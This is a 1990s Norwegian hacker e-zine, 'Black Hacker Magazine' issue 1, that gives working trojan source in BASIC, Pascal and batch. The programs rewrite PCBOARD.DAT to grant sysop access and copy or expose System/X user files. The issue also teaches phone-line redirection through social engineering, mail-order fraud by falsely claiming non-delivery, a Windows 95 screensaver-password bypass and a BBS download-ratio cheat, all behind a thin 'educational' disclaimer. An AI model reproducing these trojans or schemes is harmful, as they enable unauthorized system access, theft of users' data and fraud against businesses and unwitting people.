@@ -1,0 +1,493 @@
+·                                                         .______
+:            _/\_.     _/\_.     _/\_____  _/\_______ _/\_|     /
+¦           _\_  |_____\_  |_____\____   \_\_  .____/_\_  |  __/
+|:.        /     l_   \_   l    \_   .    \_   l    \_         \_
+|:::.     /______.     |___.     |___|     |___.     |____|     |
+|:::::.       wBr`-----'   `-----'   `-----'   `-----'    `-----'
+`------------------------------------ -- -.______ - -- ------------------.
+       _/\_.___  _/\_____  _/\_______ _/\_|     /_/\_____  _/\_____ ·::::|
+      _\_  |   \_\____   \_\_  .____/_\_  |  __/_\_  __  \_\_____  \  ·::|
+     /          \_   .    \_   l    \_         \_    \___/\_   _/ _/    ·|
+<---/______|     |___|     |___.     |____|     |____.     |___|    \_---'
+   `-----'   `-----'   `-----'    `-----'    `-----'-u!`-----'
+                          -*-  MAGAZINE -*-
+
+                -*- black hacker magazine edition 1 -*-
+
+
+
+^Note: We do not encourage people to do illigal stuff like hacking, and that
+ kinda shit, we give information about it for prevental & educationally 
+ purposes only, so that sysops using these systems can protect theirselves.
+ Such information should be free in a true democracy...^
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+TABLE OF CONTENTS:
+   1.1 - PREFACE
+   1.2 - HACKING SECTION
+   1.2a - How to hack a BBS (General)
+   1.2b - How to hack Pcboard  (Pascal & Basic trojans)
+   1.2c - How to hack System/X (Pascal & Batch trojan)
+   1.3 - PHREAKING SECTION
+   1.3a - How to trace your lines for free!
+   1.3b - How to call around the world for local fee!
+   1.4 - SOME TIPS&HINTS
+   1.4a - How to get CD's, Radio's, etc. for free! (legal!)
+   1.4b - A little WIN95 bug.
+   1.4c - How to use free download on every BBS.
+   1.5 - POSTGRADUATE (ENDING WORDS)
+
+PROGRAMS.ZIP contains the diffrent trojan examples in this magazine,
+     sources and compiled versions.
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+
+1.1 - PREFACE
+---------------------------------------------------------------------------
+Welcome to this first edition of BLACK HACKER MAGAZINE. BHM is a new mag in
+the H/P/A/C/V world, and since the writers are from Norway, we will see
+everything from a norwegian view. That means that if you're from Norway,
+these things explained here will 100% guaranteed work! (If we tell you how
+to call free, it WILL work!). Most of the stuff herein will also work
+in other countries around the world, and the hacking trojans/techniques
+will ofcourse work everywhere.  We'll try to explain how easy it really is
+to hack the  most populear systems around the world (and in Norway), like
+PCBOARD 15.X, SYSTEM/X, etc. BHM is an official release by THE BLACK
+HACKERS, but that doesn't necessary mean that all the persons writing for 
+this mag, are members of TBH. (It doesn't mean that they aren't either :)
+Hope you enjoy this edition of BHM, and that you'll give us some feedback
+on what you think of it, or if you think you have something to contribute
+to the mag, and become a member.
+
+
+
+
+
+
+                         -*- HACKING SECTION -*-
+
+
+
+
+1.2a - How to hack a BBS (General)
+*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*
+
+                     HACKING A BULLETIN BOARD SYSTEM
+
+Many people think that hacking is very hard to manage, and only computer
+wizards that has been coding for 10 years know how to do it, but in fact,
+hacking is a very easy thing to do. Any BBS system can be hacked, the only
+question is HOW?
+
+If you want to hack a system, the first ting you do, is call up a BBS and
+download the system.     Either it's PCBOARD, BBBS, MBBS, S/X, etc. just
+download the system, and unpack it. Then you configure it, and set it up,
+until it runs nicely. There's no point of throwing away money, now you can
+experiment, and try out hacking teqnices without paying jack shit :)...
+You can do this in many ways. Fex. look for backdoors/errors in the system.
+But that will take some time, if you have no clue at all -> Did the maker
+of the system put in a backdoor, or?...  The most efficient way (the one I
+use) is to check out it's config and system files (*.CFG, *.DAT, *.etc ->
+you'll find it) and check if they're pretty easy to change or what... And
+you can also check if the system needs to have PATH variables (other inter-
+esting variables) set in the enviroment, to run. If it does; Think of ways
+to exploit these variables.
+
+Most BBS systems actually have quite open cfg files, that can be configured
+easily by a trojan. Fex. PCBOARD has the PCBOARD.DAT were the lines 6 to 23
+is the Security level needed to start the sysop functions. If you use/
+explore/experiment/look at the system for a while, I guarantee you; You will
+find something that you can use to hack the system. Any system can be hacked,
+and the only thing you need, is basic programming skills. Easy BASIC or
+BATCH skills will do, but PAS/C++/ASSEMBLY skills is ofcourse preferable.
+
+Hack some board! Don't listen to what others say: The first time is *GREAT*:)
+
+Codeblaster/TBH^Food
+
+
+1.2b - How to hack Pcboard  (Pascal & Basic trojans)
+*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*
+
+                     HOW TO HACK PCBOARD v15.X
+
+Every BBS system is really quite simple to hack, if you just know something
+about it. And after having a PCBOARD BBS some time, I've learned some things
+about its system/configuration files, and ofcourse; How to hack it! :)
+
+I don't think there are any backdoors in Pcboard (if you're not using a PPE
+with backdoors in that is), and Pcboard can not be hacked using ANSi codes
+or something like that either (as far as I know)... That means, that there
+is only two GOOD ways to hack a Pcboard:
+1. Using a PPE with a backdoor.
+2. Making a trojan.
+Number 1 you can use with lamers, but a Sysop that know a little about PCB
+will always (and I say always, cause I've never met a Pcb sysop that doesn't)
+decompile the PPE and check it for backdoors. So, the best way to hack it,
+is by using a trojan. Here's a trojan that you can use to hack Pcb:
+
+--------------------------> HACKPCB.BAS <-----------------------------------
+OPEN "PCBOARD.DAT" FOR INPUT AS #1
+OPEN "PCBTMP.DTA" FOR OUTPUT AS #2
+WHILE NOT EOF(1)
+X = X + 1
+LINE INPUT #1, LINE$
+IF X = 16 THEN LINE$ = "000"
+IF X = 19 THEN LINE$ = "000"
+PRINT #2, LINE$
+WEND
+CLOSE #1: CLOSE #2
+KILL "PCBOARD.DAT"
+NAME "PCBTMP.DTA" AS "PCBOARD.DAT"
+--------------------------> HACKPCB.BAS <-----------------------------------
+
+As small and harmfull as this little .BAS file seems, it will actually give
+you access to 2 sysop commands: EXECUTE DOS COMMAND & USER MAINTAINANCE.
+These commands are all you need to hack a board, but if you want to use other
+commands, you just add: IF X = 6 THEN LINE$ = "000" up to 23...
+
+This .BAS file could be done better. After all it's just a little example so
+you can build further on. For this one to work, the sysop must place it in
+the PCBOARD directory. You can exploit the %PCBDRIVE% and %PCBDIR% variables,
+to get the PCB path (Belive it or not, some lame sysop's actually have these
+variables set in their enviroment... Hack! Hack! Hack! :)
+Here's another trojan, this one made in Pascal:
+
+---------------------------> PCBHACK.PAS <----------------------------------
+{                   PCBHACK.PAS (For Turbo Pascal 7.0)
+  Simple routine for patching the PCBOARD.DAT so that any user can use one
+  sysop function: "EXECUTE DOS FUNCTION" (It's all you need to hack PCBOARD
+  and get access to ALL sysop commands..:)   It will only work if it is placed
+  in the same directory as PCBOARD.DAT. PCBOARD.DAT will neither grow or
+  loose size... Needs optimizing you're gonna use it; errorchecking, searching
+  for PCBOARD.DAT (so it can be started from any dir) -> Use your imagination,
+  this is just an example, and is not meant to be usable for hacking :)..
+  Although you probably could hack some lamer with it ... heh ...
+
+
+   Made by Codeblaster/Food
+}
+PROGRAM HACKPCB;
+
+var FIL: text;
+    FIL2: text;
+    LINE: string;
+    LINENUM: integer;
+
+begin;
+Assign(Fil, 'PCBOARD.DAT');                     { open PCBOARD.DAT for read }
+Assign(Fil2, 'PCBTMP.TMP');                     { open TEMP file for write }
+Rewrite(Fil2);
+Reset(Fil);
+While not Eof(Fil) do
+      begin;
+    Readln(Fil,LINE);                   {Read a line from PCBOARD.DAT}
+    Linenum := Linenum + 1;
+    If Linenum = 19 then LINE := '000'; { Trojan: Sec.Level needed=0 }
+    Writeln(Fil2,LINE);                 { Write a line to TEMP file }
+       end;
+Close(Fil2);                                    { Save new file }
+Erase(fil);                                     { Erase old file }
+Rename(Fil2,'PCBOARD.DAT');                     { Rename new file to old }
+end.
+---------------------------> PCBHACK.PAS <----------------------------------
+
+Enough PCBOARD hacking for today :)
+
+                             Text & examples written by Codeblaster/TBH^Food
+
+
+
+
+1.2c - How to hack System/X (Batch trojan)
+*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*
+                   HACKING SYSTEM EXPRESS (SYSTEM/X)
+
+I installed SYSTEM/X on my PC for the only purpose of hacking it :), and it
+took me and TNSe 5 minuts (top!) to find out how to do it... This must be the
+most crappy system when it comes to Hack-protection ever!! :)
+Anyway, we found out that there was two easy and secure ways to hack system/x
+with a trojan;
+1. ADDING A NEW COMMAND (.CMD file)
+2. JUST THE PLAIN OLD USER FILE COPY :)
+Both these ways are secure, and they will almost always work nicely. One big
+reason is: The S/X sysop must have a variable set in his enviroment:
+"SYSTEM=C:\HISBBSPATH\"
+They often do this by placing a "SET SYSTEM=C:\MYBBSPATH\" in their AUTOEXEC.BAT
+or in their SX batch file. If the variable above is not set, then SYSTEM/X
+won't run... Easy to exploit or what?! :)... The little batch file below,
+will copy the USER file to HOLD.. This will almost always work, as the only
+directory the S/X sysops change is the main one (The other directories like
+\HOLD, \COMMANDS, etc. they will not touch)...
+Let's take a look at a simple batch trojan:
+
+----------------------------> HACKSX.BAT <-----------------------------------
+@echo off
+if exist %SYSTEM%\DATA\USERS.DAT goto FOUNDIT
+goto END
+:FOUNDIT
+copy %SYSTEM%\DATA\USERS.DAT %SYSTEM%\HOLD >nul
+:END
+ECHO.
+ECHO Did not find any SX*.TMP -> Please run SYSTEM/X to take care of this.
+ECHO.
+----------------------------> HACKSX.BAT <-----------------------------------
+
+This 9 lines long BATCH file will copy the USERS.DAT to \HOLD wich means that
+you'll be able to download it. This hack is for downloading his user data only,
+and you cannot have the fun DOSSHELL, etc... but what the heck, you can call
+back as Sysop later... :)  The batch file is a pretty secure hack because of
+the environment variables that are explained above.
+
+Here's a trojan written in Pascal, it will also exploit the variables in the
+environment:
+
+----------------------------> HACKSX.PAS <-----------------------------------
+{HACKSX.PAS
+   This .PAS file will create the file NEW.CMD in the SX\COMMANDS
+   directory. The file contains a new command that can be used when
+   in System/X. The command is meant for Sysop originaly, but the
+   securitye level needed now is only 0. When you call the board
+   after sysop has run this file, you can just write "NEW" to view
+   any file on his HD (User.dat, log, etc.)
+   The program will find the directory to place the file, by checking
+   the Environment variables. As said earlier; these variables has to
+   be set, if you run System/X.
+
+
+   By Codeblaster }
+
+
+PROGRAM HACKSYSTEMX;
+
+uses Dos;
+label foundit,endoffile;
+var FIL: text;
+    LINE: string;
+    LINENUM: integer;
+    i: integer;
+    found: integer;
+    path: string;
+
+begin
+ for I := 1 to EnvCount do
+   if POS('SYSTEM=',EnvStr(i)) > 0 then
+   begin;
+   found := 1;
+   goto foundit;
+   end;
+   if POS('SYSTEM =',EnvStr(i)) > 0 then
+    begin;
+    found := 2;
+    goto foundit;
+    end;
+writeln('');
+writeln('You do not have the correct variables set in your environment');
+writeln('');
+goto endoffile;
+foundit:
+path := EnvStr(i);
+if found = 1 then Delete(path,1,7);
+if found = 2 then Delete(path,1,8);
+Assign(Fil, path+'\COMMANDS\NEW.CMD');
+Rewrite(Fil);
+Writeln(Fil,';----------------------------------------------------------------------------');
+Writeln(Fil,'; Command "VS" Config File for System/X v1.0 BETA X-XMAS''94');
+Writeln(Fil,';----------------------------------------------------------------------------');
+Writeln(Fil,'COMMAND_INTERNAL     = 9');
+Writeln(Fil,'COMMAND_SECLVL       = 0');
+Writeln(Fil,'COMMAND_PASSWORD     =');
+Writeln(Fil,'COMMAND_PWD_PROMPT   = Enter_Password:');
+Writeln(Fil,'COMMAND_BEFORE_TXT   =');
+Writeln(Fil,'COMMAND_AFTER_TXT    =');
+Writeln(Fil,'COMMAND_BEFORE_DOOR  =');
+Writeln(Fil,'COMMAND_AFTER_DOOR   =');
+Close(Fil);
+endoffile:
+end.
+----------------------------> HACKSX.PAS <-----------------------------------
+
+That's all SYSTEM/X hacking you're gonna get for this time...
+                                                         Codeblaster/TBH^Food
+
+
+*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*
+
+
+
+
+
+                        -*- PHREAKING SECTION -*-
+
+
+
+
+1.3a - How to trace your lines for free!
+*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%
+
+                    HOW TO TRACE YOUR LINE FOR FREE!
+
+If you run an elite/pirat board it's a great advantage to have your lines
+traced, so that you can see who's calling. You're much safer, and the chance
+for getting busted is minimal! You can see if a person types in fake phone
+number, and if he does, you can check him up. (Just look in the phonebook,
+or call an operator -> You'll know if he's a cop then). But, let's get down
+to it, shall we?! :)... Swedish dewdes reading this are real lucky, cause
+they won't have any trouble getting their hands on the thing I'm going to
+tell you about now. It's a little box that they sell in Sweden. You attatch
+it to your phone, and you get the number of the person calling on a display
+the same sec. the phone rings. Cool eyh?! :)
+Here's where you can order it:
+
+                       STAR TEL -> +46-58552020
+
+The price of the little beauty is 395,- (Swedish Krones -> aprox. 55$)
+But, as I said, the swedish is the lucky ones, cause they don't sell to
+foreigns. :(... I called them and tried to order one, but the bitch in
+the phone just said: "Sorry, we don't sell to norwegians" (In swedish
+ofcourse)... Hmm... but if you have a friend in sweden, it's all yours :)
+
+The best part is: It's perfectly legal!.. (In Norway that is, if you're in
+another country, I dunno...)  I called the norwegian TeleNor to check it up,
+and I talked to this guy. He said it wasn't anything illigal about the box,
+and that it would most likely work in Norway too, as the swedish and the
+norwegian Phone-system is very similar.
+
+                          Diz info brought to you by ^ Codeblaster/TBH^Food
+
+
+1.3b - How to call around the world for local fee!
+*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%
+              
+              CALL AROUND THE WORLD AND ONLY PAY FOR LOCAL CALL!
+ 
+I think everybody knows about this neat trick by now, but it's so cool that
+I'm going to have it here anywayze :)... The phone-company has this service
+that gives you the opitunity to redirect your phone when you're away, so that
+if someone calls you, they will be redirected to a friend/neightbour of yours.
+This is mainly to prevent thiefs from knowing that you're not at home.
+The service can easily be exploitet, so that you can call world-wide, and
+only pay for a local call... Pretty cool, I'll say. :)
+
+The hard part is to find someones phone to redirect. You can do this in many
+ways; Fex. go into a shop right before closing time and ask them if you can
+borrow their phone a little bit (Most will say yes, for service). If you
+redirect it then, no one will notice it before the day after. All night
+calling! :)... Or you can be a real *BUDDY* and go over to a friend of yours
+and redirect his phone :)... Or you can just call random numbers until there
+is a kid/nerd/lamer answering the phone, and tell him "Hello. this is from
+the phone company. We have to check something on the line. Can you please
+write down these digits I tell you and enter them when I hang up?" :)..heh!
+
+Here's how to redirect the phone in Norway (Viderekobling):
+
+*21* + PHONENUMBER + #
+And to remove it away again: #21#
+
+Quite easy huh?! =)
+
+                         Diz info brought to you by ^ Codeblaster/TBH^Food
+*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%
+
+
+
+
+                       -*- SOME HINTS & TIPS -*-
+
+
+1.4a - How to get CD's, Radio's, etc. for free! (legal!)
+[i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i]
+
+         HOW TO GET CD'S, KNIFES, RADIOS FOR FREE! TOTALLY LEGAL!
+
+METHOD 1: (Very legal, and very safe)
+-------------------------------------
+A couple a times per year you get some Mail-order catalouges in your mailbox.
+In these catalouges they often advertice that you get a little present if you
+"hurry up - and answer quick!" (Nor: Hurtigsvarspremie). That little gift is
+often a little radio, pen, knife, watch etc, and what many people don't
+know is that you can get these things they advertise for FREE, without
+ordering their magazine (or whatever they're selling).  You have, in fact,
+the right to demand the stuff send to you for free (only mail costes charged)
+according to Norwegian law. (That's right! You don't pay jack shit for the
+radio, just the mail -> as long as it says: "Hurtigsvarspremie"-> or something
+like that, as explained in english above)
+
+So, the only thing you gotta do is call up the mail-order firm, and tell them
+that you want the thing send to you for free, without beeing a member of their
+(fucking) club/magazine. If they won't send you, then tell them that you have
+the right to claim this after norwegian law, and that you will report them
+to "forbrukerombudet" if they don't send it to you.
+
+METHOD 2: (Not legal, but pretty safe)
+--------------------------------------
+This is pretty simple. You just order the CD's/video's you want (not many,
+they have to fit your mailbox you know) and when you get them you just wait.
+A couple of weeks later you'll get a bill saying that you have to pay, and
+they've probably added some money to the ammount (Nor: Purring).
+Then you can take action. Call them and tell them that you didn't get any
+CD's. (remember not to do this before you get the second bill).
+They'll say that the CD's probably have been lost in the mail, and that
+they'll check it up with your local post-office.
+Ofcourse, they never really do this, it's just to scare you. (But so what if
+they do? -> Someone could have stolen it from your mail-box).
+I've done this several times, and it have worked every one of them -> there's
+nothing the Mail-order people can do, but to sit back and watch you steal
+their CD's :) ... but remember: Never do this too many times, and never to
+the same company more than twice (they'll get suspicious!), and never order
+too much, cause then you'll have to go down to the post-office and collect
+the packet (sign for it)-> and then they KNOW that you have got it!
+
+Happy frauding!
+
+                                                iNfO by Codeblaster/TBH^Food
+
+
+1.4b - A little WIN95 bug.
+[i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i]
+
+           HOW TO BYPASS THE SCREENSAVER-PASSWORD IN WIN95
+
+If you're in a computer store there often are several maschines standing
+around with screensavers on. When you touch the maschines, you gotta enter
+a password to do anything. Well, this is a pretty stupid BUG in WIN95, but
+to bypass these screensaver-passwords without restarting the computer is
+actually quite easy. Just press CTRL-ALT-DEL and choose END TASK (On the
+screensaver ofcourse! (Marquee etc.))  Stuuupid bug, eyh?! :)
+
+1.4c - How to use free download on every BBS.
+[i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i]
+ 
+               HOW TO DOWNLOAD WITHOUT LOOSING BYTES
+
+Everybody knows about this little trick, but coz it's so neat I'll put it in
+here too :)...  This works on every BBS system (I think).
+Here's what you do:
+1 - Flag the files you want to download
+2 - Flag a last file that you don't want (preferable big)
+3 - Start downloading
+4 - When the BBS starts sending the last file press Ctrl-X
+And voila -> the bytes you downloaded are not registered.
+
+[i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i][i]
+
+
+
+
+                         -*- POSTGRADUATE -*-
+
+
+1.5 Ending words.
+--------------------------------------------------------------------------
+Well, this was the first edition of BHM. What do you think?!.. Did you
+learn anything?! -> Give me some feedback and we'll continue writing
+BLACK HACKER MAGAZINE. If I don't get any feedback at all, I'll probably
+not write a second edition, even bad feedback is better than no feedback.
+So, you can e-mail me at most boards in Norway under: Codeblaster .
+(or just Codeblaster), og you can e-mail me at "bjornbo@askoy.vgs.no"
+
+Hope you enjoyed BHM#1, watch out for the next one!
+
+                                                     Codeblaster/TBH^Food
+
+BTW; This one was entirely written by me... hope next one won't! Contribute!
